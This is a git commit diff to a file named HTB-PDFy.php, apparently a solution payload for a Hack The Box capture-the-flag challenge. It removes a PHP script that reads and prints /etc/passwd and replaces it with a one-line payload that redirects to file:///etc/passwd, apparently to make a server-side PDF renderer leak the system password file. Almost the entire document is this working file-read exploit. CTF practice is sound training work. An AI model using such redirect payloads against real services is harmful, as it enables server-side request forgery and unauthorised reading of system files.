ceb3ad1140cda51a12600a4949f41b331703494f
veritas <50308392+veritas-rt@users.noreply.github.com>
2024-05-26 14:57:29 +0900

    Update HTB-PDFy.php

--- HTB/HTB-PDFy.php
+++ HTB/HTB-PDFy.php
@@ -1,15 +1,1 @@
-<?php
-$filename = '/etc/passwd';
-if (file_exists($filename)) {
-    $file = fopen($filename, 'r');
-
-    while (($line = fgets($file)) !== false) {
-        echo $line . "<br>";
-    }
-
-    // ファイルを閉じる
-    fclose($file);
-  
-    header("location:file:///etc/passwd")
-
-?>
+<?php header('location:file:///etc/passwd'); ?>
